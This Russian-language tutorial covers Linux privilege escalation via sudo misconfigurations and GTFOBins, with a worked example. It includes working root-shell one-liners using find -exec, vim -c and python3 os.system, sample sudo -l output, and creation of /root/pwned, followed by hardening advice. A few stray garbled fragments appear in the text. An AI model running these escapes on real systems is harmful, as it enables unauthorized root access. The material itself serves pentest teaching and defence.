# Анализ sudo-прав и сопоставление с GTFOBins: методология повышения привилегий на Linux

## Контекст и базовые понятия

Повышение привилегий (Privilege Escalation) на Linux-системах является критической фазой тестирования на проникновение,发生于 после получения начального доступа к системе с низким уровнем прав (например, через веб-уязвимость или фишинг). Целью данной фазы является получение прав суперпользователя (root) или администратора для полного контроля над инфраструктурой. В экосистеме Linux механизмы делегирования прав реализуются через несколько независимых, но часто пересекающихся технологий. Понимание разницы между ними необходимо для выбора корректного вектора атаки.

Ключевым инструментом делегирования прав является `sudo`. Это программа, позволяющая пользователям выполнять команды от имени другого пользователя (по умолчанию root) в соответствии с политикой `sudoers`. В отличие от `su` (substitute user), который требует знания пароля целевого пользователя, `sudo` позволяет администраторам предоставлять гранулярные права конкретным пользователям или группам без передачи паролей. Ошибки конфигурации `sudo` (например, использование wildcards `*`, отсутствие ограничения аргументов или указание `NOPASSWD` для опасных утилит) являются одной из самых частых причин успешного повышения привилегий.

Вторым важным механизмом являются SUID/SGID-биты. SUID (Set User ID) позволяет исполняемому файлу запускаться с правами владельца файла, а SGID (Set Group ID) — с правами группы владельца. Если файл принадлежит root и имеет SUID-бит, любой пользователь, запустивший его, получит права root на время выполнения. Однако наличие SUID-бинарника само по себе не гарантирует повышения привилегий: уязвимость возникает только если этот бинарник позволяет выполнять произвольные команды или манипулировать памятью.

Третьим аспектом являются Linux Capabilities (возможности). Capabilities делят привилегии root на мелкие части (например, `CAP_NET_RAW`, `CAP_SYS_ADMIN`). Это более безопасная альтернатива SUID, так как бинарник получает только необходимые права, а не полный доступ root. Однако многие утилиты, обладающие определенными capabilities (например, `CAP_SETUID` или `CAP_DAC_OVERRIDE`), могут быть использованы для получения полной оболочки root.

GTFOBins (Get The F\*\*k Out Binaries) — это репозиторий (база знаний), документирующий легитимные Unix-утилиты, которые могут быть использованы для обхода локальных ограничений безопасности, повышения привилегий и выполнения произвольных команд. GTFOBins не является инструментом эксплуатации, а служит справочником: он показывает, какие именно функции утилиты (например, `vim` или `find`) позволяют выполнить код.

| Характеристика | Sudo | SUID/SGID Биты | Linux Capabilities |
|---|---|---|---|
| **Механизм действия** | Делегирование прав через файл `/etc/sudoers` | Флаг файловой системы (`chmod u+s`) | Метаданные ядра (xattr) |
| **Гранулярность** | Высокая (команда + аргументы + хост) | Низкая (весь бинарник) | Средняя (конкретная привилегия ядра) |
| **Управление** | Администратором ОС (sudoers) | Системным администратором (chmod) | Системным администратором (setcap) |
| **Типичная ошибка** | Wildcards (`*`), NOPASSWD, относительные пути | Установка на утилиты с интерпретаторами (vim, python) | Назначение опасных прав (CAP_SETUID) |
| **Вектор атаки** | Эксплуатация аргументов утилиты | Эксплуатация функционала утилиты | Эксплуатация функционала утилиты |

Разграничение понятий `sudo` и `SUID` критично: `sudo` — это правило доступа к запуску программы, `SUID` — это атрибут самой программы. Утилита может быть доступна через `sudo` без SUID-бита, и наоборот. GTFOBins покрывает оба сценария, так как описывает функционал бинарников, а не контекст их запуска.

## Внутреннее устройство предмета

Внутреннее устройство процесса повышения привилегий через `sudo` и GTFOBins состоит из трех основных компонентов: механизма парсинга `sudoers`, каталога уязвимых утилит GTFOBins и логики эксплуатации (exploit logic).

### Механизм работы sudo и файл sudoers

Файл `/etc/sudoers` определяет политику доступа. Синтаксис правила имеет вид:
`user host=(runas) command`
Например: `alice ALL=(root) /usr/bin/find`
Это позволяет пользователю `alice` запускать `find` от имени `root` на любом хосте. Ключевые элементы, создающие уязвимость:
1.  **NOPASSWD**: Отключение запроса пароля. Позволяет автоматизировать атаку.
2.  **Wildcards (`*`, `?`)**: Разрешение запуска файлов, имена которых совпадают с шаблоном. Если путь к бинарнику или его аргументам содержит wildcards, возможно подмена файла (path hijacking).
3.  **Относительные пути**: Указание команды без полного пути (например, `vim` вместо `/usr/bin/vim`) позволяет пользователю подменить бинарник в своей `$PATH`.
4.  **Отсутствие ограничения аргументов**: Разрешение `ALL` аргументов для интерактивных утилит (редакторов, оболочек) дает полный контроль.

### Структура базы GTFOBins

GTFOBins — это не просто список, а структурированная база данных, где каждая утилита имеет страницу с разделами:
*   **Description**: Функционал утилиты.
*   **Shell**: Как получить интерактивную оболочку.
*   **Sudo**: Как использовать через `sudo` (если применимо).
*   **Capabilities**: Как использовать с правами capabilities.
*   **SUID**: Как использовать с SUID-битом.
*   **Exploits**: Ссылки на CVE или специфические техники.

Каждая техника в GTFOBins описывает *инвариант*: если утилита поддерживает функцию X, и у нас есть право на запуск этой утилиты с повышенными привилегиями, то мы можем выполнить произвольный код.

### Логика сопоставления (Matching Logic)

Процесс сопоставления прав с GTFOBins является алгоритмическим:
1.  **Инвентаризация**: Получение списка всех утилит, доступных с повышенными правами (через `sudo -l` или `find -perm`).
2.  **Фильтрация**: Отсев стандартных утилит, не имеющих интерактивных функций (например, `ls`, `cat` без аргументов).
3.  **Поиск в базе**: Для каждой утилиты проверяется наличие записи в GTFOBins.
4.  **Верификация**: Проверка, что конкретная версия утилиты поддерживает описанную технику (некоторые уязвимости закрыты в новых версиях).

| Элемент анализа | Ключевые признаки уязвимости | Типичные индикаторы в логах/конфигах |
|---|---|---|
| **Wildcards в sudo** | Наличие `*` в аргументах команды | `sudo /usr/bin/find /home -name *.txt` |
| **NOPASSWD + Shell** | Отсутствие пароля для оболочек | `user ALL=(root) NOPASSWD: /bin/bash` |
| **SUID + Interpreter** | Бинарник запускает скрипты | `ls -la /usr/bin/perl` (SUID бит) |
| **Relative Path** | Команда без `/` в sudoers | `sudo vim` (вместо `/usr/bin/vim`) |

## Применение и работа с предметом

На практике аудит sudo-прав и сверка с GTFOBins выполняется в рамках этапа Post-Exploitation. Процесс включает ручную и автоматизированную.enumerацию, анализ конфигурации и выбор техники эксплуатации.

### Ручная и автоматизированная энумерация

Первым шагом является запуск `sudo -l`. Эта команда запрашивает у системы список команд, которые текущий пользователь может выполнить с правами root. Важно использовать флаг `-U <user>`, если мы проверяем права другого пользователя (например, после чтения `/etc/passwd`).

```bash
# Проверка прав текущего пользователя
sudo -l

# Проверка прав конкретного пользователя (если есть доступ к чтению sudoers или права на выполнение)
sudo -U target_user -l
```

Вывод `sudo -l` содержит список правил. Критически важно обращать внимание на:
1.  Наличие `NOPASSWD`.
2.  Использование wildcards (`*`, `?`, `[`, `]`).
3.  Относительные пути.
4.  Команды, которые могут запускать подпроцессы или интерактивные оболочки.

Для автоматизации используются скрипты, такие как `LinPEAS`, `LinEnum` или `sudo-check`. Они сканируют систему и выводят потенциальные векторы атаки. Однако автоматические скрипты могут давать ложные срабатывания, поэтому ручная проверка через GTFOBins обязательна.

### Сверка с GTFOBins

После получения списка утилит необходимо проверить каждую из них на сайте [gtfobins.github.io](https://gtfobins.github.io/) или через локальную копию. Поиск осуществляется по имени бинарника.

На странице утилиты в GTFOBins ищутся разделы:
*   **Sudo**: Если утилита доступна через `sudo`, там будет пример команды.
*   **Capabilities**: Если утилита имеет capabilities, там будет пример.
*   **SUID**: Если утилита имеет SUID-бит, там будет пример.

Пример для `vim`:
```bash
# Если vim доступен через sudo
sudo vim -c ':!/bin/sh'
```
Эта команда запускает vim с правами root, а затем выполняет `/bin/sh`.

### Типичные ошибки и подводные камни

1.  **Игнорирование аргументов**: GTFOBins показывает, что утилита уязвима, но не всегда учитывает, какие аргументы разрешены в `sudoers`. Если в `sudoers` указано `sudo /usr/bin/find /tmp -name *.txt`, то wildcards позволяют подменить файл, но не дают прямой оболочки. Нужно использовать технику `find` с `-exec`.
2.  **Версии утилит**: Некоторые техники работают только на старых версиях. Например, exploit для `sudo` через CVE-2021-3156 (Baron Samedit) работает только на версиях до 1.8.31. Всегда проверяйте версию `sudo` (`sudo -V`).
3.  **Ограничения оболочки**: Если `sudo` настроен с `env_keep` или `env_reset`, переменные окружения могут быть очищены, что сломает некоторые техники (например, LD_PRELOAD).
4.  **Ложные срабатывания SUID**: Не все SUID-файлы уязвимы. `find`, `vim`, `python` — уязвимы. `ping`, `ssh` — обычно нет (если нет специфических аргументов).

## Сквозной практический пример: Повышение привилегий через sudo и GTFOBins

**Исходные условия**:
*   **Среда**: Linux-сервер (Ubuntu 20.04/Debian 10), на котором есть учетная запись `dev_user`.
*   **Доступ**: У `dev_user` есть права на запуск определенных команд через `sudo` без пароля (`NOPASSWD`).
*   **Инструменты**: Терминал, доступ к интернету (для поиска в GTFOBins), утилита `sudo`.
*   **Роль**: Пентестер, имеющий доступ к shell от имени `dev_user`.

**Шаг 1: Инвентаризация sudo-прав**

Пентестер выполняет команду `sudo -l` для выявления доступных привилегий.

```bash
dev_user@target:~$ sudo -l
Matching Defaults entries for dev_user on target:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User dev_user may run the following commands on target:
    (root) NOPASSWD: /usr/bin/find
    (root) NOPASSWD: /usr/bin/vim
    (root) NOPASSWD: /usr/bin/python3
```

*Ожидаемый вывод*: Список из трех утилит, доступных с правами root без ввода пароля.

**Шаг 2: Анализ утилит через GTFOBins**

Пентестер проверяет каждую утилиту на [gtfobins.github.io](https://gtfobins.github.io/).

1.  **find**: GTFOBins показывает, что `find` может выполнять произвольные команды через аргумент `-exec`.
    *   *Техника*: `sudo find /tmp -name test -exec /bin/sh \;`
2.  **vim**: GTFOBins показывает, что `vim` может запускать оболочки через команду `:shell` или `-c`.
    *   *Техника*: `sudo vim -c ':!/bin/sh'`
3.  **python3**: GTFOBins показывает, что `python3` может запускать оболочки через `os.system` или `pty.spawn`.
    *   *Техника*: `sudo python3 -c 'import os; os.system("/bin/sh")'`

**Шаг 3: Выбор вектора и проверка ограничений**

Пентестер выбирает `find`, так как он часто встречается в системах и его использование менее заметно для администраторов, чем запуск `vim` или `python`. Однако, нужно убедиться, что `find` не имеет ограничений на аргументы. В выводе `sudo -l` для `find` нет ограничений, значит, можно передавать любые аргументы.

**Шаг 4: Эксплуатация**

Пентестер выполняет команду `find` с правами root, используя технику из GTFOBins.

```bash
dev_user@target:~$ sudo find /tmp -name test -exec /bin/sh \;
# Ожидается, что команда выполнится без запроса пароля
# и запустит оболочку /bin/sh от имени root
```

*Ожидаемый результат*:
```bash
# id
uid=0(root) gid=0(root) groups=0(root)
# hostname
target
```

**Шаг 5: Верификация**

Пентестер проверяет, что оболочка действительно работает от root, и создает файл в защищенной директории.

```bash
# touch /root/pwned
# ls -l /root/pwned
-rw-r--r-- 1 root root 0 Oct 10 10:00 /root/pwned
```

*Ожидаемый вывод*: Файл создан в `/root`, что подтверждает наличие прав root.

**Ожидаемый вывод примера**:
Пример демонстрирует полный цикл повышения привилегий: от энумерации прав `sudo` до выбора техники из GTFOBins и успешной эксплуатации. Ключевым фактором успеха является отсутствие ограничений на аргументы утилиты `find` в конфигурации `sudoers`.

## Аналитический вывод

Повышение привилегий через `sudo` и GTFOBins является одним из наиболее эффективных методов атаки на Linux-системы, так как он опирается на легитимные инструменты, что затрудняет обнаружение средствами EDR. Успех атаки зависит не от уязвимостей в самих утилитах, а от ошибок конфигурации `sudoers` (wildcards, NOPASSWD, отсутствие ограничения аргументов). GTFOBins служит критическим мостом между знанием функционала утилит и пониманием их потенциальной опасности в контексте повышенных прав.

Для защиты от таких атак администраторам необходимо применять принцип наименьших привилегий: избегать использования `NOPASSWD` для интерактивных утилит, всегда указывать полные пути к бинарникам в `sudoers`, избегать wildcards в аргументах и регулярно обновлять `sudo` для закрытия известных CVE. Автоматизированный аудит конфигурации `sudo` и интеграция проверок на GTFOBins в пайплайны CI/CD или скрипты хеарденинга являются необходимыми практиками для минимизации рисков.
